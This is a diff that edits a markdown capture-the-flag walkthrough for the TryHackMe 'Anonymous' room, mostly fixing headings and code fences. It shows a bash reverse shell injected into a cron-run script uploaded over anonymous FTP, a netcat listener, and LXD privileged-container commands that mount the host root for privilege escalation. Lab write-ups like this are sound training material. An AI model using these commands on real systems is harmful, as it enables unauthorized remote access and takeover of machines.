@@ -26,80 +26,79 @@ No web server was found, so a full TCP scan was run to check for missed ports.
 
 Two more ports were discovered: standard SMB ports.
 
-###Step 2: Service Analysis
+### Step 2: Service Analysis
 
 We discovered anonymous FTP login is allowed.
 
-###Step 3: FTP Enumeration
+### Step 3: FTP Enumeration
 
 Connect to FTP using:
-`
+```
 ftp <target-ip>
-`
+```
 Explore the files on the FTP share:
 
-    To_do.txt – Reminder to disable anonymous login
-
-    clean.sh – Bash script deleting /tmp files
-
-    removed_files.log – Logs of deleted files
+`To_do.txt – Reminder to disable anonymous login
+clean.sh – Bash script deleting /tmp files
+removed_files.log – Logs of deleted files`
 
 Since the script is run by cron, modifying clean.sh allows us to inject a reverse shell.
-###Step 4: SMB Enumeration
+### Step 4: SMB Enumeration
 
 SMB share named pics allowed NULL authentication.
 
-###Step 5: Gaining a Shell
+### Step 5: Gaining a Shell
 
 Edit clean.sh and add a bash reverse shell with your IP:
-`
+```
 bash -i >& /dev/tcp/<your-ip>/4444 0>&1
-`
+```
 Upload the modified script using FTP put:
-`
+```
 ftp> put clean.sh
-`
+```
 Start a listener on your machine:
-`
+```
 nc -lvnp 4444
-`
+```
 Wait for the cron job to execute clean.sh. A few seconds later, a shell is obtained.
 
-###Step 6: Capture User Flag
+### Step 6: Capture User Flag
 
 Navigate to the user's home directory:
-`
-cd /home/namelessone
+```
 cat user.txt
-`
-###Step 7: Privilege Escalation
+```
+### Step 7: Privilege Escalation
 
 Found potential privilege escalation via LXD.
 
 ###Step 8: Exploiting LXD
 
 LXD is Ubuntu's container manager using Linux containers. Users in the lxd group can be exploited to gain root.
-
-    Download LXD Alpine builder from GitHub.
-
-    Build a small Alpine Linux image.
-
-    Upload the image to the target machine.
-
-    Import the image into LXC:
 `
+Download LXD Alpine builder from GitHub.
+Build a small Alpine Linux image.
+Upload the image to the target machine.
+Import the image into LXC:
+`
+```
 lxc image import alpine.tar.gz --alias myalpine
-`
-Create and start a container:
-`
-lxc init myalpine privesc -c security.privileged=true
-lxc config device add privesc mydisk disk source=/ path=/mnt
-lxc start privesc
-lxc exec privesc -- /bin/bash
-`
+```
+Run following commands
+```
+lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+lxc image list
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+cd /mnt/root
+chroot /mnt/root /bin/bash
+```
 We now have root access on the box.
 
-###Step 9: Capture Root Flag
+### Step 9: Capture Root Flag
 `
 cat /root/root.txt
 `
@@ -114,8 +113,5 @@ Learned about the dangers of sudo group membership and LXD.
 
 References
 
-Privilege Escalation via LXD
-
-Linux Privilege Escalation via LXD & Hijacked UNIX Socket
-
-TryHackMe Room: Anonymous
+<a href="https://reboare.github.io/lxd/lxd-escape.html">Privilege Escalation via LXD</a>
+TryHackMe Room: <a href="https://tryhackme.com/room/anonymous">Anonymous</a>
